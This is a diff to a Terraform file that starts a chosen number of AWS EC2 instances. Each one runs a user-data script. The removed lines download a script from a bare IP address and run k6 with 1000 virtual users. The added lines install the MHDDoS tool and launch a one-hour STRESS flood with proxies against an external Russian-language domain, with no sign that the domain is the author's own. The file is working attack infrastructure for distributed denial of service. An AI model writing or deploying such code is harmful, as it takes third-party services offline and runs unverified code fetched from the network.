@@ -14,9 +14,9 @@ data "aws_ami" "ubuntu" {
   owners = ["099720109477"]
 }
 
-data "template_file" "userdata" {
-  template = file("userdata.sh")
-}
+#data "template_file" "userdata" {
+#  template = file("userdata.sh")
+#}
 
 resource "aws_instance" "ec2" {
   count = var.instance_count
@@ -37,11 +37,16 @@ apt update
 sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69
 echo "deb https://dl.k6.io/deb stable main" | sudo tee /etc/apt/sources.list.d/k6.list
 sudo apt update
-sudo apt install k6
-sudo apt install wget
-wget http://194.37.81.106/script.js
-chmod +x script.js
-k6 run script.js --vus 1000 --duration 360s
+sudo apt install -y k6 wget software-properties-common python3 pip
+sudo pip install gdown aiohttp
+cd tmp
+git clone https://github.com/MHProDev/MHDDoS.git
+cd MHDDoS
+pip3 install -r requirements.txt
+python3 start.py STRESS http://xn--80aqakjqje5byf.xn--80adrabb4aegksdjbafk0u.xn--p1ai 0 980 proxy.txt 91 3601
+#sudo gdown -O script.js "https://docs.google.com/uc?export=download&id=1WQmvlvAKbwuqH5sJb1YP0_gVTZnTZPtk"
+#chmod +x script.js
+#k6 run script.js --vus 1000 --duration 3600s
 EOF
   tags = {
     Name = "${var.env_name}"
